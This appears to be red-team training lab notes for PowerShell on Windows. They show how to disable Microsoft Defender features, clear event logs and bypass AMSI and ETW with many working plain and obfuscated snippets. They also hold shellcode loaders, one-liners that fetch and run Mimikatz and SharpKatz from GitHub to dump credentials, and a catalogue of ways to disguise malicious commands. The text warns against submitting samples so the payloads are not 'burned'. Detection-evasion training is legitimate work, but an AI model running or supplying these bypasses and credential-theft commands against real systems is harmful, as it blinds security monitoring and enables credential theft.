<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>

# Powershell Lab - Bypassing AMSI and ETW

> ***IMPORTANT*** : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
> **Make sure at all times that sample submussion in Microsoft Defender is `turned off`, and if for some reason you get prompted to submit a sample, deny the request.**

> ***ENABLE POWERSHELL LOGGING*** : For this lab and all future labs, turn on powershell logging on your windows machine.

![image](./images/ps_gpol.jpg)

Go to Local Computer Policy - Computer Configuration - Administrative Templates - Windows Components.

![image](./images/ps_gpol1.jpg)

Scroll down to Microsoft Powershell and enable `MODULE LOGGING` and `SCRIPT BLOCK LOGGING`.

![image](./images/ps_gpol2.jpg)

This will log any powershell commands and script contents run in a powershell console - using eventviewer we can have a look for Event ID 800, 4103 and 4104. Open Eventviewer and go to `Applications and Services Logs` - `MICROSOFT` - `POWERSHELL` - `OPERATIONAL`.

![image](./images/ps_evt.jpg)

![image](./images/ps_evt1.jpg)


Make exceptions in Windows Defender:

```bash
[+] C:\Downloads -> to make it easier to download our tools with out AV Detection
[+] C:\THEV -> our training course
[+] C:\Temp -> Used by GoCheck
[+] C:\SysinternalsSuite
```

We can do this using powershell:

```powershell
Add-MpPreference -ExclusionPath "C:\SysinternalsSuite"
(Get-MpPreference).ExclusionPath
```

We can check some general Defender settings in powershell:

```powershell
Get-MpComputerStatus
Get-MpThreat
```

Turning off various modules of Microsoft Defender using powershell:

### Real-Time Protection
`Real-Time Protection`: This is a feature of Microsoft Defender that continuously monitors your system for threats (e.g., malware, viruses) in real-time. It scans files, apps, and processes as they are accessed or executed. Setting DisableRealtimeMonitoring to $true turns off real-time protection, meaning files and processes are no longer automatically scanned.

This does not disable Microsoft Defender entirely — it only disables real-time scanning. Other features like ***scheduled scans and manual scans will still work***.

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Cloud-Delivered Protection
The `MAPSReporting` setting controls the Microsoft Active Protection Service (MAPS), also referred to as `Cloud-Delivered Protection`. Setting it to Disabled stops your system from sending information about threats to Microsoft and prevents it from receiving `cloud-based threat intelligence` in real time.

```powershell
Set-MpPreference -MAPSReporting Disable
```

### Automatic Sample Submission
`SubmitSamplesConsent` controls how Microsoft Defender submits samples of suspicious or potentially harmful files to Microsoft for analysis. These samples help improve Defender’s detection and protection capabilities.

`NeverSend`: This value tells Microsoft Defender to disable all sample submissions. No files will be sent to Microsoft for further analysis, even if they’re flagged as suspicious.

```powershell
Set-MpPreference -SubmitSamplesConsent NeverSend
```

| Consent Level | Description                       |
|---------------|-----------------------------------|
| 0             | Always Prompt                     |
| 1             | Send Safe Samples Automatically   |
| 2             | Never Send                        |

### Periodic Scanning
The `DisableScanningNetworkFiles` setting in Microsoft Defender controls whether network files are scanned. When you set DisableScanningNetworkFiles to $true, it disables the scanning of files located on network drives

```Powershell
Set-MpPreference -DisableScanningNetworkFiles $true
```
### AMSI Settings
```powershell
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableScriptScanning

DisableRealtimeMonitoring DisableScriptScanning
------------------------- ---------------------
                    False                 False
```

# LAB - Evading AMSI

> For this lab we will enable ``Microsoft Defender`` - in order to demonstrate how AMSI works, and how to bypass it.

Check if Defender is turned on by either pasting the powershell commands below, or by running the checkav.ps1 script:

Open a powershell prompt:

```powershell
cd \thev\labs\powershell
.\checkav.ps1
```

The script contains the following code:

```powershell
[PSCustomObject]@{
    "Real-Time Protection"        = if ((Get-MpComputerStatus).RealTimeProtectionEnabled -eq $false) {"disabled"} else {"enabled"}
    "Cloud-Delivered Protection"  = if ((Get-MpPreference).MAPSReporting -eq 0) { "disabled" } else { "enabled" }
    "Automatic Sample Submission" = if ((Get-MpPreference).SubmitSamplesConsent -eq 2) { "disabled" } else { "enabled" }
    "Periodic File Scanning"      = if ((Get-MpPreference).DisableScanningNetworkFiles -eq $true) {"disabled"} else {"enabled"}
} | Format-Table -AutoSize
```

The output should be like this :

![image](./images/ps_defsettings.jpg)

>**IMPORTANT**: Make sure Real-Time Protection is `enabled` and the rest is `disabled` - if this is not the case just run the following script, it will configure the right settings.

```powershell
cd \thev\labs\powershell
.\enableav.ps1
```

Before we start let's clear the powershell event logs, so there's no noise from before in there. You can do this by opening a powershell console and typing the following command:

```powershell
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

Now from the same powershell terminal, run SharpKatz from memory with IEX (Invoke Expression)

```Powershell
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/crimsoncore/Invoke-SharpKatz/refs/heads/main/Invoke-SharpKatz.ps1");Invoke-SharpKatz
```

We'll see the script won't execute since AMSI intercepted it before executing and has sent it to Defender that scanned it and determined it as malicious:

![image](./images/ps_invokesharkpkatzblocked.jpg)

Let's have a look at the EventViewer logs - open EventViewer, select **"Application and Services Logs"**, **"Microsoft"**,**"Windows"**, **"Powershell"** and finally **"Operational"**.

![image](./images/ps_eventvwr.jpg)

OK, so now what?

**Bypassing AMSI - How it works**

Let's clear the powershell event logs again:

```powershell
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

`NEW ONE`:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

>Invoke-obfuscation
>set scriptblock [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
>token
>string
>2

output =
```powershell
[Ref].Assembly.GetType(("{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}"-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField(("{0}{1}{2}" -f 'amsi','InitFa','iled'),("{1}{0}{4}{2}{3}" -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
```

Safe both commands to a file and run gocheck64

And now let's run an obfuscated AMSI Bypass from the same powershell terminal:

`OLD ONE`

```powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c, ' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

And let's try that Invoke-SharpKatz again, if all goes well, AMSI should be patched and the script will run:

Success!!!

> ***DETECTIONS***
> Eventlog 800, 4103, 4104
> 
----

However bypassing AMSI doesn't disable eventlogs - which are useful telemetry for EDR's, SIEM's and UEBA's. Let's open Eventviewer again and see what was logged.

A very cool Forensics tools that can anaylyze powershell logs is `Powershell-Hunter` - if we run this on our powershell logs it will also flag some suspicious commands.

Ideally we don't want any of these logs to be generated and thus shutting off the telemety for security solutions, we can do this by patchin ETW (Event Tracing for Windows).

Let's clear the powershell event logs again before we apply the ETW bypass (remember AMSI is already patched so this ETW bypass doesn't need to be obfuscated):

```powershell
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

**ETW Bypass**

```powershell
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

In summary, this command does the following:

>**[+]** Uses reflection to access internal, non-public fields in .NET classes.
>
>**[+]** Targets the etwProvider object within PowerShell’s PSEtwLogProvider class, which handles ETW logging.
>
>**[+]** Sets the m_enabled field of the underlying EventProvider to false, disabling ETW event logging for PowerShell activities.
>
>**Result**: PowerShell commands, script blocks, and other activities that would normally be logged via ETW (e.g., for security monitoring or auditing) will no longer generate ETW events, making them harder to detect by security tools like Windows Defender, Sysmon, or other EDR solutions that rely on ETW.

If we want to use this first, without an AMSI Bypass, we'll have to obuscate it, otherwise AMSI will trigger on this code. We'll use `Invoke-Obfuscastion`.

```powershell
cd \thev\invoke-obfuscation
import-module invoke-obfuscation.psd1
invoke obfuscation
```


![image](./images/ps_obfuscopen.jpg)

then we'll enter our script into Invoke-Obfuscation.

```powershell
SET SCRIPTBLOCK [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

Next we'll select "token", "string" and "2", re-order.

Our output command is now:

```powershell
[Reflection.Assembly]::LoadWithPartialName(("{1}{0}{2}" -f 'm.Co','Syste','re')).GetType(("{10}{0}{6}{7}{1}{4}{11}{5}{8}{2}{9}{3}"-f '.D','i','Event','ider','cs','Eventi','iagnos','t','ng.','Prov','System','.')).GetField(("{0}{1}{2}" -f 'm','_e','nabled'),("{1}{2}{0}{3}{4}"-f 'P','No','n','ublic,I','nstance')).SetValue([Ref].Assembly.GetType(("{5}{7}{6}{4}{0}{9}{8}{2}{11}{10}{3}{1}"-f 'nagement.','er','n','rovid','Ma','Syst','.','em','tomatio','Au','cing.PSEtwLogP','.Tra')).GetField(("{0}{1}{3}{2}"-f'et','wP','vider','ro'),("{1}{3}{2}{0}"-f'tic','No','ic,Sta','nPubl')).GetValue($null),0)
```

With "copy" we can copy it to our clipboard, open a new powershell and past the command. Then check eventviewer!

![image](./images/ps_obfuscate.jpg)


powershell shellcode loader (without amsi bypass)

```powershell
$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode

$code = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("msvcrt.dll", SetLastError=true)] public static extern IntPtr memcpy(IntPtr dest, byte[] src, uint count);
}
"@

Add-Type -TypeDefinition $code

# Allocate memory
$mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)

# Copy shellcode to memory
[Win32]::memcpy($mem, $shellcode, $shellcode.Length)

# Create thread to execute shellcode
$thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Wait for thread to exit (optional)
[System.Runtime.InteropServices.Marshal]::WaitForSingleObject($thread, 0xFFFFFFFF)
```

Shorter version:

```powershell
$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode

# Allocate memory
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)

# Copy shellcode to memory
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)

# Create thread to execute shellcode
$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [System.Threading.ThreadStart])

# Start the thread
$thread.Invoke()

# Wait for thread to exit (optional)
[System.Threading.Thread]::Sleep(-1)
```

# AMSI and ETW bypass in 1:
https://github.com/BlackShell256/Null-AMSI?tab=readme-ov-file

```powershell
iex (iwr -UseBasicParsing https://raw.githubusercontent.com/BlackShell256/Null-AMSI/refs/heads/main/Invoke-NullAMSI.ps1);Invoke-NullAmsi -etw -v;IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/crimsoncore/Invoke-SharpKatz/refs/heads/main/Invoke-SharpKatz.ps1");Invoke-SharpKatz
```

Another AMSI Bypass:

```powershell
$t=[Ref].Assembly.GetType(('System.Manage'+'ment.Automa'+'tion.AmsiUtils'));
$f=$t.GetField(('amsiIn'+'itFailed'),'NonPublic,Static');
$f.SetValue($null,$true);
```
<https://medium.com/@0xHossam/powershell-exploits-modern-apts-and-their-malicious-scripting-tactics-7f98b0e8090c>

includes c-code!!!

AMSIBYPASS
---

> This bypass does not require administrator rights!!!

Works on 1903, 1909 and before

```yaml
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c, ' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

List `dirty` words: 

```yaml
[ScriptBlock].GetField('signatures', 'NonPublic, Static').GetValue($null)
```

----

Los er door:

```powershell
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b


And finally AMSI.FAIL

or this also works

```powershell
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
```

then run

```powershell
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
```


**C# Example:**

```csharp
using System;
using System.Reflection;

public class AmsiBypass
{
    public static void Main(string[] args)
    {
        try
        {
            // Get the AmsiUtils type
            Type amsiUtilsType = typeof(System.Management.Automation.AmsiUtils);

            // Get the amsiInitFailed field
            FieldInfo amsiInitFailedField = amsiUtilsType.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);

            // Set the amsiInitFailed field to true
            if (amsiInitFailedField != null)
            {
                amsiInitFailedField.SetValue(null, true);
                Console.WriteLine("AMSI bypassed.");
            }
            else
            {
                Console.WriteLine("amsiInitFailed field not found.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }
}
```
## Key Considerations:

* **Assembly Loading:**
    * If your .NET binary doesn't already have `System.Management.Automation.dll` loaded, you may need to load it explicitly using `Assembly.Load()` or related methods.
* **.NET Version Compatibility:**
    * Ensure that the reflection code is compatible with the .NET Framework or .NET Core/.NET 5+ version that the target binary is using.
* **Security Implications:**
    * AMSI bypass techniques can be used for malicious purposes. Use them responsibly and ethically.
* **EDR Detection:**
    *
* **Finding the correct assembly:**
    * In some .net applications, the `System.Management.Automation.dll` may not be loaded. If this is the case, you will need to load it.

**In summary:** The AMSI bypass technique using reflection is not limited to PowerShell and can be successfully implemented in .NET binaries.

-----
# dotnet packing

ConfuserEx
Babel

----
https://github.com/pracsec/AmsiScanner/tree/main/src

https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patching-Clr

| Technique                                                   | Patches CLR | Patches AMSI | Works in 2025? |
| ----------------------------------------------------------- | ----------- | ------------ | -------------- |
| Patching AmsiScanBuffer in clr.dll                          | Yes         | Yes          | Possible       |
| ScriptBlock Smuggling                                       | No          | No           | Possible       |
| Reflection ScanContent Change                               | Yes         | Yes          | Unlikely       |
| Using Hardware Breakpoints                                  | No          | Yes          | Possible       |
| Using CLR Hooking                                           | Yes         | No           | Likely         |
| Patch the provider’s DLL of Microsoft MpOav.dll             | No          | Yes          | Unlikely       |
| Scanning Interception and Provider Function Patching        | Yes         | Yes          | Possible       |
| ***Patching AMSI AmsiScanBuffer by rasta-mouse *** USED!    | No          | Yes          | Unlikely       |
| Patching AMSI AmsiOpenSession                               | No          | Yes          | Unlikely       |
| Don’t Use Net WebClient                                     | No          | No           | Obsolete       |
| Amsi ScanBuffer Patch from Contextis                        | No          | Yes          | Unlikely       |
| Forcing an Error                                            | No          | Yes          | Unlikely       |
| Disable Script Logging                                      | No          | No           | Possible       |
| Amsi Buffer Patch - In Memory                               | No          | Yes          | Unlikely       |
| Same as 6 but Integer Bytes Instead of Base64               | No          | Yes          | Unlikely       |
| Using Matt Graeber’s Reflection Method                      | Yes         | Yes          | Unlikely       |
| Using Matt Graeber’s Reflection Method with WMF5            | Yes         | Yes          | Unlikely       |
| Using Matt Graeber’s Second Reflection Method               | Yes         | Yes          | Unlikely       |
| Using Cornelis de Plaa’s DLL Hijack Method                  | No          | Yes          | Unlikely       |
| Use PowerShell Version 2 - No AMSI Support                  | No          | No           | Unlikely       |
| Nishang All in One                                          | Yes         | Yes          | Possible       |
| Adam Chesters Patch                                         | No          | Yes          | Unlikely       |
| Patching AmsiScanBuffer in System.Management.Automation.dll | Yes         | Yes          | Possible       |

```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

Use this one:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

>Invoke-obfuscation
>set scriptblock [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
>token
>string
>2

output =
```powershell
[Ref].Assembly.GetType(("{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}"-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField(("{0}{1}{2}" -f 'amsi','InitFa','iled'),("{1}{0}{4}{2}{3}" -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
```
---
<https://github.com/RythmStick/AMSITrigger/releases/download/v4/AmsiTrigger.exe>

# AMSI-Trigger
```powershell
AmsiTrigger.exe -i=C:\temp\Invoke-Shellcode.ps1 -f=2 -d
```
```powershell
PS C:\temp> AmsiTrigger.exe -i=C:\temp\Invoke-Shellcode.ps1 -f=2 -d
[1]     "Invoke-Shellcode"
[8]     "Invoke-Shellcode"
[34]    "Invoke-Shellcode"
[38]    "Invoke-Shellcode"
[46]    "Invoke-Shellcode"
[54]    "Invoke-Shellcode"
[189]   "Inject-RemoteShellcode"
[301]   "Inject-LocalShellcode"
[491]   "Inject-RemoteShellcode"
[515]   "Inject-LocalShellcode"


Chunks Processed: 17
Triggers Found: 10
AmsiScanBuffer Calls: 2160
Total Execution Time: 3.7543251 s
```

# GoCheck64.exe

```powershell
PS C:\temp> gocheck64.exe .\Invoke-Shellcode.ps1 --amsi

[*] Threat detected in original file, beginning AMSI binary search...
[*] Scanning .\Invoke-Shellcode.ps1, analysing 23807 bytes...

[+] AMSI - 2.1105264s
[!] Isolated bad bytes at offset 0x52D2 in the original file [approximately 21202 / 23807 bytes]
00000000  65 6d 6f 74 65 54 68 72  65 61 64 41 64 64 72 20  |emoteThreadAddr |
00000010  3d 20 47 65 74 2d 50 72  6f 63 41 64 64 72 65 73  |= Get-ProcAddres|
00000020  73 20 6b 65 72 6e 65 6c  33 32 2e 64 6c 6c 20 43  |s kernel32.dll C|
00000030  72 65 61 74 65 52 65 6d  6f 74 65 54 68 72 65 61  |reateRemoteThrea|
00000040  64 0d 0a 20 20 20 20 20  20 20 20 24 43 72 65 61  |d..        $Crea|
00000050  74 65 52 65 6d 6f 74 65  54 68 72 65 61 64 44 65  |teRemoteThreadDe|
00000060  6c 65 67 61 74 65 20 3d  20 47 65 74 2d 44 65 6c  |legate = Get-Del|
00000070  65 67 61 74 65 54 79 70  65 20 40 28 5b 49 6e 74  |egateType @([Int|

[+] Total time elasped: 2.1139199s
PS C:\temp> gocheck64.exe .\Invoke-Shellcode.ps1 --defender
[*] Found Windows Defender at C:\Program Files\Windows Defender\MpCmdRun.exe
[*] Scanning .\Invoke-Shellcode.ps1, analysing 23807 bytes...
[*] Threat detected in the original file, beginning binary search...

[!] 0x0 -> 0x52A4 - malicious: false - 2.0659043s

[+] Windows Defender - 2.8526233s
[!] Isolated bad bytes at offset 0x52D2 in the original file [approximately 21202 / 23807 bytes]
00000000  73 20 6b 65 72 6e 65 6c  33 32 2e 64 6c 6c 20 43  |s kernel32.dll C|
00000010  72 65 61 74 65 52 65 6d  6f 74 65 54 68 72 65 61  |reateRemoteThrea|

[*] Trojan:PowerShell/Powersploit
[*] Trojan:PowerShell/Powersploit.A

[+] Total time elasped: 2.8569887s
```

# TEST IF AMSI IS BYPASSED

The EICAR test string should no longer trigger, proving AMSI in no longer working:

```powershell
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```
# POWERSHELL OBFUSCATION TECHNIQUES (Invoke-Obfuscation)

## List of PowerShell Obfuscation Techniques

### 1. Backtick (`) Character for Line Continuation
- **Description**: The backtick (`) is PowerShell’s escape character, used to continue a command across multiple lines or escape special characters. In obfuscation, it breaks up strings or commands to make them harder to read or match against signatures (e.g., AMSI’s detection of `Invoke-Mimikatz`).
- **Example**:
  ```powershell
  $cmd = "Invo" + "ke-Mi" + "mikatz"
  & $cmd
  ```
  - **Explanation**: The backtick splits `Invoke-Mimikatz` across lines, and concatenation reconstructs it. This can evade simple string matching by AMSI, though modern AMSI may still detect the final executed string.

### 2. String Concatenation
- **Description**: Combining multiple string fragments to form a command or keyword, avoiding direct use of sensitive terms (e.g., `AmsiUtils`). This breaks up detectable patterns and is often paired with other techniques like backticks.
- **Example**:
  ```powershell
  $part1 = "Invo"
  $part2 = "ke-Mimi"
  $part3 = "katz"
  $command = $part1 + $part2 + $part3
  Invoke-Expression $command
  ```
  - **Explanation**: Concatenates `Invoke-Mimikatz` from fragments, executed via `Invoke-Expression`. AMSI may still detect the final script block if it reconstructs the string.

### 3. Base64 Encoding
- **Description**: Encodes a script or command as a Base64 string, which is decoded and executed at runtime using `FromBase64String` or PowerShell’s `-EncodedCommand` parameter. This hides the script’s content in a non-readable format.
- **Example**:
  ```powershell
  $base64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output "Invoke-Mimikatz"'))
  $script = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($base64))
  Invoke-Expression $script
  ```
  - **Explanation**: Encodes `Write-Output "Invoke-Mimikatz"` as Base64, decodes, and executes it. AMSI may scan the decoded script block, so this alone may not bypass detection.

### 4. String Replacement
- **Description**: Replaces parts of a string with alternative characters or substrings at runtime to reconstruct a command, avoiding direct use of sensitive keywords.
- **Example**:
  ```powershell
  $cmd = "Xnvokx-MxmXkXtz"
  $cmd = $cmd -replace 'X', 'i' -replace 'x', 'e' -replace 'X', 'a'
  Invoke-Expression $cmd
  ```
  - **Explanation**: Replaces placeholders to form `Invoke-Mimikatz`. This can evade static analysis, but AMSI may detect the final string after replacement.

### 5. Character Encoding (ASCII/Unicode)
- **Description**: Represents characters using their ASCII or Unicode values, constructing strings dynamically to avoid literal keywords.
- **Example**:
  ```powershell
  $cmd = [char]73 + [char]110 + [char]118 + [char]111 + [char]107 + [char]101 + '-' + [char]77 + [char]105 + [char]109 + [char]105 + [char]107 + [char]97 + [char]116 + [char]122
  Invoke-Expression $cmd
  ```
  - **Explanation**: Uses ASCII values (e.g., 73 = `I`, 110 = `n`) to build `Invoke-Mimikatz`. This is harder to read but may still be detected by AMSI after execution.

### 6. Variable Name Obfuscation
- **Description**: Uses random, complex, or misleading variable names to obscure the script’s purpose, making it harder for analysts to understand.
- **Example**:
  ```powershell
  $x7a9pQ = "Invoke-Mimikatz"
  &$x7a9pQ
  ```
  - **Explanation**: Assigns `Invoke-Mimikatz` to a random variable name and executes it. This doesn’t evade AMSI but complicates manual analysis.

### 7. Invoke-Expression (Dynamic Execution)
- **Description**: Uses `Invoke-Expression` (or aliases like `iex`) to execute dynamically constructed strings, hiding the final command until runtime.
- **Example**:
  ```powershell
  $cmd = "Write" + "-Output 'Invoke-Mimikatz'"
  Invoke-Expression $cmd
  ```
  - **Explanation**: Builds and executes a command dynamically. AMSI scans the final script block, so this alone may not bypass detection.

### 8. Splatting
- **Description**: Uses a hashtable to pass parameters or commands, obscuring the command structure by breaking it into key-value pairs.
- **Example**:
  ```powershell
  $splat = @{
      Cmdlet = "Write-Output"
      Argument = "Invoke-Mimikatz"
  }
  & $splat.Cmdlet $splat.Argument
  ```
  - **Explanation**: Executes `Write-Output "Invoke-Mimikatz"` via splatting. This obscures the command but doesn’t prevent AMSI from scanning the final script block.

### 9. Format Operator (-f)
- **Description**: Uses the `-f` operator to format strings dynamically, constructing commands or keywords from placeholders.
- **Example**:
  ```powershell
  $cmd = "{0}-{1}" -f "Invoke", "Mimikatz"
  Invoke-Expression $cmd
  ```
  - **Explanation**: Formats `Invoke-Mimikatz` using `-f`. AMSI may detect the final string after formatting.

### 10. Obfuscated String Splitting
- **Description**: Splits a string into substrings and reassembles it at runtime, often using arrays or random splits to avoid detection.
- **Example**:
  ```powershell
  $parts = @("In", "vo", "ke-", "Mimi", "katz")
  $cmd = $parts -join ""
  Invoke-Expression $cmd
  ```
  - **Explanation**: Splits `Invoke-Mimikatz` into an array and joins it. This can evade static analysis, but AMSI scans the joined string.

### 11. XOR Encoding
- **Description**: Applies XOR operations to encode strings, decoding them at runtime with a key to reconstruct the original command.
- **Example**:
  ```powershell
  $key = 0x42
  $encoded = [byte[]]@(0x2f, 0x38, 0x3f, 0x37, 0x2b, 0x65, 0x20, 0x29, 0x3c, 0x3c, 0x2b, 0x2a, 0x38, 0x3d)
  $decoded = $encoded | ForEach-Object { $_ -bxor $key }
  $cmd = [Text.Encoding]::ASCII.GetString($decoded)
  Invoke-Expression $cmd  # Decodes to "Invoke-Mimikatz"
  ```
  - **Explanation**: XOR-encodes `Invoke-Mimikatz`, decodes at runtime. This is harder to detect statically, but AMSI may scan the decoded string.

### 12. Environment Variable Substitution
- **Description**: Uses environment variables to store parts of a command, substituting them at runtime to build the script.
- **Example**:
  ```powershell
  $env:PART1 = "Invoke"
  $env:PART2 = "Mimikatz"
  $cmd = "$env:PART1-$env:PART2"
  Invoke-Expression $cmd
  ```
  - **Explanation**: Stores `Invoke` and `Mimikatz` in environment variables. This spreads the command across system state, but AMSI scans the final script block.

### 13. Comment Injection
- **Description**: Inserts comments or irrelevant code to obscure the script’s logic, making it harder to analyze manually.
- **Example**:
  ```powershell
  # This is a harmless script
  $cmd = "Invoke-Mimikatz" # Just a test
  # Some unrelated comment
  &$cmd
  ```
  - **Explanation**: Adds comments to distract analysts. Doesn’t evade AMSI but complicates human review.

### 14. Randomized Case (Mixed Case)
- **Description**: Uses mixed upper and lower case for commands or strings to avoid exact string matches.
- **Example**:
  ```powershell
  $cmd = "iNvOkE-mImIkAtZ"
  Invoke-Expression $cmd
  ```
  - **Explanation**: Randomizes case for `Invoke-Mimikatz`. PowerShell is case-insensitive, so this executes, but AMSI normalizes case for detection.

### 15. Pipeline Obfuscation
- **Description**: Uses complex pipelines with `ForEach-Object`, `Where-Object`, or other cmdlets to obscure command construction.
- **Example**:
  ```powershell
  $parts = @("Invoke", "Mimikatz")
  $cmd = $parts | ForEach-Object { $_ } | Join-String -Separator "-"
  Invoke-Expression $cmd
  ```
  - **Explanation**: Builds `Invoke-Mimikatz` through a pipeline. This adds complexity but doesn’t prevent AMSI from scanning the final string.

### 16. Compressed Scripts
- **Description**: Compresses a script using `System.IO.Compression` (e.g., Deflate or GZip), decompressing and executing it at runtime.
- **Example**:
  ```powershell
  $script = 'Write-Output "Invoke-Mimikatz"'
  $bytes = [Text.Encoding]::Unicode.GetBytes($script)
  $ms = New-Object IO.MemoryStream
  $cs = New-Object IO.Compression.DeflateStream($ms, [IO.Compression.CompressionMode]::Compress)
  $cs.Write($bytes, 0, $bytes.Length)
  $cs.Close()
  $compressed = $ms.ToArray()
  $ms.Close()
  # Decompress and execute
  $ms = New-Object IO.MemoryStream(,$compressed)
  $ds = New-Object IO.Compression.DeflateStream($ms, [IO.Compression.CompressionMode]::Decompress)
  $reader = New-Object IO.StreamReader($ds)
  $decompressed = $reader.ReadToEnd()
  Invoke-Expression $decompressed
  ```
  - **Explanation**: Compresses the script, decompresses, and executes. This hides the script statically, but AMSI scans the decompressed script block.

### 17. Reflection-Based Obfuscation
- **Description**: Uses .NET reflection to access and execute commands or types dynamically, avoiding direct cmdlet names.
- **Example**:
  ```powershell
  $type = [Type]::GetType("System.Management.Automation.PowerShell")
  $ps = $type::Create()
  $cmd = "Invoke-Mimikatz"
  $ps.AddScript($cmd).Invoke()
  ```
  - **Explanation**: Uses reflection to invoke PowerShell commands. This is complex but still subject to AMSI scanning of the script block.

